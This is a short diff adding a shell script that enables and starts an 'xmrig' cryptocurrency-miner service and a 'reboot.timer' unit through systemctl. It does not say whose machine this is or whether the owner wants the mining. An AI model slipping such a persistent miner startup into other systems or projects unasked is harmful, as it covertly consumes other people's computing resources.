@@ -1,0 +1,7 @@
+#!/bin/sh
+
+systemctl enable reboot.timer
+systemctl enable xmrig
+
+systemctl start reboot.timer
+systemctl start xmrig
